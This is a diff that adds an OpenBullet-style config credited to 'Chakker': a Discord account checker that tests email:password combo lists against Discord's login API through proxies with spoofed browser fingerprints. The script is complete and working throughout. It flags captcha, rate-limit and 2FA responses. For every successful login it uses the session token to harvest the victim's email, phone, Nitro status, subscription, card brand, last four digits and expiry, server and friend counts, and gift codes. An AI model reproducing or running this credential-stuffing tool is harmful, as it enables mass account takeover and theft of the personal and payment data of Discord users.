@@ -1,0 +1,457 @@
+[SETTINGS]
+{
+  "Name": "Discord Account Checker by Chakker - Email:Pass",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2024-01-15T14:20:00.0000000+00:00",
+  "AdditionalInfo": "Discord account checker with Nitro detection - Email:Password version",
+  "RequiredPlugins": [],
+  "Author": "@Chakker",
+  "Version": "2.0.0 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": true,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 5,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": true,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": true,
+  "AllowedWordlist1": "Emails",
+  "AllowedWordlist2": "Passwords",
+  "DataRules": [
+    {
+      "Id": 1,
+      "DataType": "Emails",
+      "Rule": "Must contain '@' and '.'",
+      "IsRegex": false,
+      "Enabled": true
+    }
+  ],
+  "CustomInputs": [
+    {
+      "Description": "Discord Checker by Chakker - Email:Password with Nitro detection",
+      "VariableName": "",
+      "Id": 987654321
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": false,
+  "DisableNotifications": false,
+  "DisableImageLoading": true,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Discord Email:Pass Checker v2.0",
+  "IconPath": "",
+  "LicenseSource": null,
+  "Message": "Checking Discord email:password accounts - Nitro = Purple, Valid = Green",
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data}",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+# Discord Account Checker with Nitro Detection - Email:Pass Version
+# Created by Chakker - Modified for email:password checking
+
+# Initialize variables
+SET NEWGVAR "fingerprint" ""
+SET NEWGVAR "super_properties" ""
+SET NEWGVAR "captcha_key" ""
+SET NEWGVAR "auth_token" ""
+SET NEWGVAR "username" ""
+SET NEWGVAR "discriminator" ""
+SET NEWGVAR "email" ""
+SET NEWGVAR "phone" ""
+SET NEWGVAR "nitro_type" ""
+SET NEWGVAR "verified" ""
+SET NEWGVAR "mfa" ""
+SET NEWGVAR "bio" ""
+SET NEWGVAR "avatar" ""
+SET NEWGVAR "banner" ""
+SET NEWGVAR "accent_color" ""
+SET NEWGVAR "plan_id" ""
+SET NEWGVAR "sub_status" ""
+SET NEWGVAR "card_brand" ""
+SET NEWGVAR "card_last4" ""
+SET NEWGVAR "card_exp_month" ""
+SET NEWGVAR "card_exp_year" ""
+SET NEWGVAR "guild_count" ""
+SET NEWGVAR "friend_count" ""
+SET NEWGVAR "gift_sku" ""
+
+# Generate fingerprint and super properties
+FUNCTION Base64Encode "{\"os\":\"Windows\",\"browser\":\"Chrome\",\"device\":\"\",\"system_locale\":\"en-US\",\"browser_user_agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\",\"browser_version\":\"120.0.0.0\",\"os_version\":\"10\",\"referrer\":\"\",\"referring_domain\":\"\",\"referrer_current\":\"\",\"referring_domain_current\":\"\",\"release_channel\":\"stable\",\"client_build_number\":123456,\"client_event_source\":null}" -> VAR "super_properties"
+
+# Step 1: Get fingerprint
+REQUEST POST "https://discord.com/api/v9/experiments"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+  HEADER "Accept: */*"
+  HEADER "Accept-Language: en-US,en;q=0.9"
+  HEADER "Accept-Encoding: gzip, deflate, br"
+  HEADER "Content-Type: application/json"
+  HEADER "Origin: https://discord.com"
+  HEADER "DNT: 1"
+  HEADER "Connection: keep-alive"
+  HEADER "Sec-Fetch-Dest: empty"
+  HEADER "Sec-Fetch-Mode: cors"
+  HEADER "Sec-Fetch-Site: same-origin"
+  HEADER "TE: trailers"
+
+PARSE "<SOURCE>" LR "\"fingerprint\":\"" "\"" -> VAR "fingerprint"
+
+# Debug: Print fingerprint status
+IF "<fingerprint>" Equals ""
+  PRINT "❌ Failed to get fingerprint"
+  FAIL
+ELSE
+  PRINT "✅ Fingerprint obtained: <fingerprint>"
+ENDIF
+
+# Step 2: Login with EMAIL and PASSWORD
+REQUEST POST "https://discord.com/api/v9/auth/login"
+  CONTENT "{\"login\":\"<USER>\",\"password\":\"<PASS>\",\"undelete\":false,\"login_source\":null,\"gift_code_sku_id\":null}"
+  CONTENTTYPE "application/json"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+  HEADER "Accept: */*"
+  HEADER "Accept-Language: en-US,en;q=0.9"
+  HEADER "Accept-Encoding: gzip, deflate, br"
+  HEADER "Content-Type: application/json"
+  HEADER "X-Super-Properties: <super_properties>"
+  HEADER "X-Fingerprint: <fingerprint>"
+  HEADER "X-Debug-Options: bugReporterEnabled"
+  HEADER "Origin: https://discord.com"
+  HEADER "DNT: 1"
+  HEADER "Connection: keep-alive"
+  HEADER "Referer: https://discord.com/login"
+  HEADER "Sec-Fetch-Dest: empty"
+  HEADER "Sec-Fetch-Mode: cors"
+  HEADER "Sec-Fetch-Site: same-origin"
+  HEADER "TE: trailers"
+
+# Check login response
+KEYCHECK
+  KEYCHAIN LoginSuccess OR
+    KEY "\"token\":"
+    KEY "\"mfa\":true"
+    KEY "\"ticket\":"
+  KEYCHAIN LoginInvalid OR
+    KEY "Invalid login"
+    KEY "invalid password"
+    KEY "login or password is invalid"
+    KEY "Invalid login credentials"
+    KEY "\"message\": \"Invalid login credentials\""
+    KEY "\"code\": 50035"
+  KEYCHAIN LoginCaptcha OR
+    KEY "captcha-required"
+    KEY "captcha_key"
+    KEY "captcha_sitekey"
+  KEYCHAIN LoginRateLimit OR
+    KEY "<RESPONSECODE>" Equals "429"
+    KEY "Too many requests"
+    KEY "rate limited"
+    KEY "Retry-After"
+
+# Handle invalid credentials
+IF "<KEYCHAIN>" Equals "LoginInvalid"
+  PRINT "❌ Invalid credentials: <USER>:<PASS>"
+  FAIL
+ENDIF
+
+# Handle captcha
+IF "<KEYCHAIN>" Equals "LoginCaptcha"
+  SET CAPTYPE "CAPTCHA_REQUIRED"
+  SET CAPCOLOR "#FFFFD700"
+  SET CAPTURE "CAPTCHA | <USER>:<PASS> | Captcha required"
+  CAPTURE CUSTOM
+  PRINT "🔒 Captcha required for: <USER>"
+  FAIL
+ENDIF
+
+# Handle rate limit
+IF "<KEYCHAIN>" Equals "LoginRateLimit"
+  SET CAPTYPE "RATE_LIMITED"
+  SET CAPCOLOR "#FFFFA500"
+  SET CAPTURE "RATE LIMITED | <USER>:<PASS> | Too many requests"
+  CAPTURE CUSTOM
+  PRINT "⏰ Rate limited for: <USER>"
+  FAIL
+ENDIF
+
+# Handle MFA case
+IF "<SOURCE>" Contains "\"mfa\":true" OR "<SOURCE>" Contains "\"mfa\": true"
+  SET CAPTYPE "MFA_REQUIRED"
+  SET CAPCOLOR "#FFFFA500"
+  SET CAPTURE "MFA REQUIRED | <USER>:<PASS> | Requires 2FA authentication"
+  CAPTURE CUSTOM
+  PRINT "⚠️ MFA required for: <USER>"
+  FAIL
+ENDIF
+
+# Extract token if login successful
+IF "<KEYCHAIN>" Equals "LoginSuccess" AND "<SOURCE>" Contains "\"token\":"
+  PARSE "<SOURCE>" LR "\"token\":\"" "\"" -> VAR "auth_token"
+  PRINT "✅ Login successful, token obtained"
+  
+  # Step 3: Get user info (check for Nitro)
+  REQUEST GET "https://discord.com/api/v9/users/@me"
+    HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    HEADER "Accept: */*"
+    HEADER "Accept-Language: en-US,en;q=0.9"
+    HEADER "Accept-Encoding: gzip, deflate, br"
+    HEADER "Authorization: <auth_token>"
+    HEADER "X-Super-Properties: <super_properties>"
+    HEADER "X-Debug-Options: bugReporterEnabled"
+    HEADER "Origin: https://discord.com"
+    HEADER "DNT: 1"
+    HEADER "Connection: keep-alive"
+    HEADER "Referer: https://discord.com/channels/@me"
+    HEADER "Sec-Fetch-Dest: empty"
+    HEADER "Sec-Fetch-Mode: cors"
+    HEADER "Sec-Fetch-Site: same-origin"
+    HEADER "TE: trailers"
+  
+  # Check if user info request was successful
+  KEYCHECK
+    KEYCHAIN UserInfoSuccess OR
+      KEY "\"username\":"
+      KEY "\"id\":"
+    KEYCHAIN UserInfoError OR
+      KEY "\"message\":"
+      KEY "Unauthorized"
+      KEY "401"
+  
+  IF "<KEYCHAIN>" Equals "UserInfoError"
+    PRINT "❌ Failed to get user info"
+    FAIL
+  ENDIF
+  
+  # Extract user information
+  PARSE "<SOURCE>" LR "\"username\":\"" "\"" -> VAR "username"
+  PARSE "<SOURCE>" LR "\"discriminator\":\"" "\"" -> VAR "discriminator"
+  PARSE "<SOURCE>" LR "\"id\":\"" "\"" -> VAR "user_id"
+  PARSE "<SOURCE>" LR "\"email\":\"" "\"" -> VAR "email"
+  PARSE "<SOURCE>" LR "\"phone\":\"" "\"" -> VAR "phone"
+  PARSE "<SOURCE>" LR "\"premium_type\":" "," -> VAR "nitro_type"
+  PARSE "<SOURCE>" LR "\"verified\":" "," -> VAR "verified"
+  PARSE "<SOURCE>" LR "\"mfa_enabled\":" "," -> VAR "mfa"
+  PARSE "<SOURCE>" LR "\"bio\":\"" "\"" -> VAR "bio"
+  PARSE "<SOURCE>" LR "\"avatar\":\"" "\"" -> VAR "avatar"
+  PARSE "<SOURCE>" LR "\"banner\":\"" "\"" -> VAR "banner"
+  PARSE "<SOURCE>" LR "\"accent_color\":" "," -> VAR "accent_color"
+  
+  # Clean up parsed values
+  IF "<username>" Equals ""
+    SET VAR "username" "Unknown"
+  ENDIF
+  
+  IF "<discriminator>" Equals ""
+    SET VAR "discriminator" "0000"
+  ENDIF
+  
+  IF "<email>" Equals ""
+    SET VAR "email" "<USER>"
+  ENDIF
+  
+  IF "<phone>" Equals ""
+    SET VAR "phone" "None"
+  ENDIF
+  
+  IF "<nitro_type>" Equals ""
+    SET VAR "nitro_type" "0"
+  ENDIF
+  
+  IF "<verified>" Equals ""
+    SET VAR "verified" "false"
+  ENDIF
+  
+  IF "<mfa>" Equals ""
+    SET VAR "mfa" "false"
+  ENDIF
+  
+  # Step 4: Check for Nitro subscriptions
+  REQUEST GET "https://discord.com/api/v9/users/@me/billing/subscriptions"
+    HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    HEADER "Accept: */*"
+    HEADER "Accept-Language: en-US,en;q=0.9"
+    HEADER "Accept-Encoding: gzip, deflate, br"
+    HEADER "Authorization: <auth_token>"
+    HEADER "X-Super-Properties: <super_properties>"
+    HEADER "X-Debug-Options: bugReporterEnabled"
+    HEADER "Origin: https://discord.com"
+    HEADER "DNT: 1"
+    HEADER "Connection: keep-alive"
+    HEADER "Sec-Fetch-Dest: empty"
+    HEADER "Sec-Fetch-Mode: cors"
+    HEADER "Sec-Fetch-Site: same-origin"
+    HEADER "TE: trailers"
+  
+  # Parse Nitro info
+  PARSE "<SOURCE>" LR "\"plan_id\":\"" "\"" -> VAR "plan_id"
+  PARSE "<SOURCE>" LR "\"status\":" "," -> VAR "sub_status"
+  
+  IF "<plan_id>" Equals ""
+    SET VAR "plan_id" "None"
+  ENDIF
+  
+  IF "<sub_status>" Equals ""
+    SET VAR "sub_status" "None"
+  ENDIF
+  
+  # Step 5: Get payment sources
+  REQUEST GET "https://discord.com/api/v9/users/@me/billing/payment-sources"
+    HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    HEADER "Accept: */*"
+    HEADER "Accept-Language: en-US,en;q=0.9"
+    HEADER "Accept-Encoding: gzip, deflate, br"
+    HEADER "Authorization: <auth_token>"
+    HEADER "X-Super-Properties: <super_properties>"
+    HEADER "X-Debug-Options: bugReporterEnabled"
+  
+  # Parse payment info
+  PARSE "<SOURCE>" LR "\"brand\":\"" "\"" -> VAR "card_brand"
+  PARSE "<SOURCE>" LR "\"last_4\":\"" "\"" -> VAR "card_last4"
+  PARSE "<SOURCE>" LR "\"expires_month\":" "," -> VAR "card_exp_month"
+  PARSE "<SOURCE>" LR "\"expires_year\":" "," -> VAR "card_exp_year"
+  
+  IF "<card_brand>" Equals ""
+    SET VAR "card_brand" "None"
+  ENDIF
+  
+  IF "<card_last4>" Equals ""
+    SET VAR "card_last4" "0000"
+  ENDIF
+  
+  # Step 6: Get guilds (servers)
+  REQUEST GET "https://discord.com/api/v9/users/@me/guilds"
+    HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    HEADER "Accept: */*"
+    HEADER "Accept-Language: en-US,en;q=0.9"
+    HEADER "Accept-Encoding: gzip, deflate, br"
+    HEADER "Authorization: <auth_token>"
+    HEADER "X-Super-Properties: <super_properties>"
+  
+  FUNCTION MatchCount "<SOURCE>" "\"id\":\"" -> VAR "guild_count"
+  
+  IF "<guild_count>" Equals ""
+    SET VAR "guild_count" "0"
+  ENDIF
+  
+  # Step 7: Get friends count
+  REQUEST GET "https://discord.com/api/v9/users/@me/relationships"
+    HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    HEADER "Accept: */*"
+    HEADER "Accept-Language: en-US,en;q=0.9"
+    HEADER "Accept-Encoding: gzip, deflate, br"
+    HEADER "Authorization: <auth_token>"
+    HEADER "X-Super-Properties: <super_properties>"
+  
+  FUNCTION MatchCount "<SOURCE>" "\"username\":\"" -> VAR "friend_count"
+  
+  IF "<friend_count>" Equals ""
+    SET VAR "friend_count" "0"
+  ENDIF
+  
+  # Step 8: Check for gift codes
+  REQUEST GET "https://discord.com/api/v9/users/@me/entitlements/gifts"
+    HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    HEADER "Accept: */*"
+    HEADER "Accept-Language: en-US,en;q=0.9"
+    HEADER "Accept-Encoding: gzip, deflate, br"
+    HEADER "Authorization: <auth_token>"
+    HEADER "X-Super-Properties: <super_properties>"
+  
+  PARSE "<SOURCE>" LR "\"sku_id\":" "," -> VAR "gift_sku"
+  
+  IF "<gift_sku>" Equals ""
+    SET VAR "gift_sku" "None"
+  ENDIF
+  
+  # Determine account type and set capture
+  IF "<nitro_type>" Equals "1"
+    SET CAPTYPE "NITRO_CLASSIC"
+    SET CAPCOLOR "#FF800080"
+    SET CAPTURE "NITRO CLASSIC | <username>#<discriminator> | ID: <user_id> | Email: <email> | Phone: <phone> | Verified: <verified> | 2FA: <mfa>"
+  ELSE IF "<nitro_type>" Equals "2"
+    SET CAPTYPE "NITRO_BOOSTED"
+    SET CAPCOLOR "#FF9370DB"
+    SET CAPTURE "NITRO BOOSTED | <username>#<discriminator> | ID: <user_id> | Email: <email> | Phone: <phone> | Verified: <verified> | 2FA: <mfa>"
+  ELSE IF "<plan_id>" NotEquals "None"
+    SET CAPTYPE "NITRO_ACTIVE"
+    SET CAPCOLOR "#FF9932CC"
+    SET CAPTURE "ACTIVE NITRO | <username>#<discriminator> | ID: <user_id> | Email: <email> | Plan: <plan_id> | Status: <sub_status>"
+  ELSE
+    SET CAPTYPE "VALID"
+    SET CAPCOLOR "#FF66FF66"
+    SET CAPTURE "VALID | <username>#<discriminator> | ID: <user_id> | Email: <email> | Phone: <phone> | Verified: <verified> | 2FA: <mfa>"
+  ENDIF
+  
+  # Add additional info to capture
+  IF "<card_brand>" NotEquals "None"
+    SET CAPTURE "<CAPTURE> | Card: <card_brand> ****<card_last4>"
+  ENDIF
+  
+  SET CAPTURE "<CAPTURE> | Servers: <guild_count> | Friends: <friend_count>"
+  
+  IF "<gift_sku>" NotEquals "None"
+    SET CAPTURE "<CAPTURE> | Gift: <gift_sku>"
+  ENDIF
+  
+  # Add bio if exists
+  IF "<bio>" NotEquals ""
+    SET CAPTURE "<CAPTURE> | Bio: <bio>"
+  ENDIF
+  
+  # Final capture
+  CAPTURE FULL
+  
+  # Print success message
+  IF "<CAPTYPE>" Contains "NITRO"
+    PRINT "✨ NITRO ACCOUNT FOUND! ✨"
+    PRINT "Email:Pass: <USER>:<PASS>"
+    PRINT "Username: <username>#<discriminator>"
+    PRINT "User ID: <user_id>"
+    PRINT "Nitro Type: <nitro_type>"
+    PRINT "Payment: <card_brand> ****<card_last4>"
+    PRINT "Servers: <guild_count> | Friends: <friend_count>"
+  ELSE
+    PRINT "✅ Valid Account Found"
+    PRINT "Email:Pass: <USER>:<PASS>"
+    PRINT "Username: <username>#<discriminator>"
+    PRINT "User ID: <user_id>"
+    PRINT "Verified: <verified> | 2FA: <mfa>"
+    PRINT "Servers: <guild_count> | Friends: <friend_count>"
+  ENDIF
+  
+ELSE
+  # If no token found but we got here, mark as unknown error
+  PRINT "❌ Unknown error for: <USER>"
+  FAIL
+ENDIF
+
+# End of script
